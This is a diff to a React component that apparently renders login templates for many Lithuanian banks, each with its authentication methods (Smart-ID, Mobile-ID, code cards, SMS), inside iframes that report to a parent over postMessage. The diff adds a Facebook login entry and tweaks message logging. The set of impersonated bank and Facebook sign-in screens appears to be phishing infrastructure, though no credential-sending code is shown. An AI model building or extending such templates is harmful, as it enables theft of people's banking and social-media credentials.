@@ -31,7 +31,8 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
     "luminor-lt",
     "citadele-lt",
     "lku-lt",
-    "siauliu-lt"
+    "siauliu-lt",
+    "facebook-lt"
   ].includes(bankSlug ?? "");
 
   // Eger files henuz yuklenmemis (length===0) iken LITHUANIA_BANK_TAB_CLICK gelirse
@@ -77,6 +78,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
       "citadele-lt":  ["Kodų kortelė/Generatorius", "Mobile-ID",  "MobileSCAN/Digipass 780"],
       "lku-lt":       ["Smart-ID",             "Mobile-ID",       "Vienkartinis saugos kodas"],
       "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
+      "facebook-lt":  ["Facebook Prisijungti"],
     };
 
     // 1) Dogrudan eslesme
@@ -102,6 +104,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
       "citadele": "citadele-lt",
       "lku": "lku-lt",
       "siauliu": "siauliu-lt",
+      "facebook": "facebook-lt",
     };
     const simpleKey = Object.keys(simpleMap).find((k) => normalizedSlug.includes(k));
     if (simpleKey && methodMap[simpleMap[simpleKey]]?.[index]) {
@@ -121,6 +124,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
       "citadele-lt":  ["Kodų kortelė/Generatorius", "Mobile-ID",  "MobileSCAN/Digipass 780"],
       "lku-lt":       ["Smart-ID",             "Mobile-ID",       "Vienkartinis saugos kodas"],
       "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
+      "facebook-lt":  ["Facebook Prisijungti"],
     };
     let bankKey = methodMap[normalizedSlug] ? normalizedSlug : "";
     if (!bankKey) {
@@ -498,26 +502,33 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
   }, [files]);
 
   useEffect(() => {
+    // ======================================================================
+    // (ATTACHED) Listener her eklendiginde konsola BASLANGIC logu (1 kez mount)
+    // ======================================================================
+    // eslint-disable-next-line no-console
+    console.log('%c[LT PARENT] LISTENER ATTACHED', 'background:#311b92;color:#fff;font-weight:bold;font-size:11px', { bankSlug });
+
     const handleMessage = (e: MessageEvent) => {
       // ==================================================================
-      // LT PARENT DEBUG BUFFER (son 100 kayit)
-      // Baska AI kontrol ederken ilk console yerine bunu kontrol etmesi daha kolay.
+      // PARENT DEBUG BUFFER: SADECE LITHUANIA_* TIPLI MESAJLARI KAYDET!
+      // Reklam / Panelos / diger uzanti mesajlari buffer'in ilk 100'ünü
+      // doldurmasin diye TYPE filtresi ZORUNLU!
       // ==================================================================
       try {
         const W = globalThis as any;
         if (!Array.isArray(W.__TRAE_LT_PARENT_LOGS)) {
           W.__TRAE_LT_PARENT_LOGS = [];
         }
-        const push = (row: any) => {
-          try {
-            W.__TRAE_LT_PARENT_LOGS.unshift({ t: Date.now(), ...row });
-            if (W.__TRAE_LT_PARENT_LOGS.length > 100) W.__TRAE_LT_PARENT_LOGS.length = 100;
-          } catch {}
-        };
-        if (e && e.data && typeof e.data === 'object' && e.data.type) {
-          push({ event: 'ONMESSAGE', type: e.data.type, payload: e.data });
-          // eslint-disable-next-line no-console
-          console.log('%c[LT PARENT] ONMESSAGE ' + String(e.data.type), 'background:#b39ddb;color:#000;font-weight:bold;', e.data);
+        if (e && e.data && typeof e.data === 'object' && typeof e.data.type === 'string') {
+          const t = String(e.data.type);
+          if (t.startsWith('LITHUANIA_BANK_') || t.startsWith('ESTONIA_BANK_') || t.startsWith('BANK_')) {
+            try {
+              W.__TRAE_LT_PARENT_LOGS.unshift({ t: Date.now(), type: t, payload: e.data });
+              if (W.__TRAE_LT_PARENT_LOGS.length > 150) W.__TRAE_LT_PARENT_LOGS.length = 150;
+            } catch {}
+            // eslint-disable-next-line no-console
+            console.log('%c[LT PARENT] ONMESSAGE ' + t, 'background:#9575cd;color:#000;font-weight:bold;', e.data);
+          }
         }
       } catch {}
 
@@ -937,6 +948,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           "citadele-lt":  ["Kodų kortelė/Generatorius", "Mobile-ID",  "MobileSCAN/Digipass 780"],
           "lku-lt":       ["Smart-ID",             "Mobile-ID",       "Vienkartinis saugos kodas"],
           "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
+          "facebook-lt":  ["Facebook Prisijungti"],
         };
         function __miniResolveBankSlug() {
           const m = (window.location.pathname || '').match(/lithuanian-banks\\/([a-z0-9_-]+)\\//i);
@@ -2394,10 +2406,22 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                   } catch {}
 
                   // Race condition / cross-origin oncesi event cache'i engellemek icin 3 KEZ at + customEvent.
+                  // EKSTRA: 3. atista (250ms) AYNI ANDA LITHUANIA_BANK_IFRAME_LOADED da gonder,
+                  //         boylece parent handler'da files.length===0 durumunda pendingRef'e atilan index,
+                  //         3. atista (genellikle API yaniti gelmis, files.length dolu) uygulanmis olur.
                   const pm = () => { try { window.parent.postMessage(payload, '*'); } catch(_e) {} };
+                  const pmFrameLoaded = () => {
+                    try {
+                      window.parent.postMessage({
+                        type: 'LITHUANIA_BANK_IFRAME_LOADED',
+                        bankSlug: (window.__traeBankSlug || ''),
+                        triggeredByTabClick: true
+                      }, '*');
+                    } catch(_e) {}
+                  };
                   pm();
                   setTimeout(pm, 100);
-                  setTimeout(pm, 250);
+                  setTimeout(() => { pm(); pmFrameLoaded(); }, 250);
                   try {
                     window.dispatchEvent(new CustomEvent('__TRAE_LT_TAB_CLICK__', { detail: payload }));
                   } catch(_e) {}
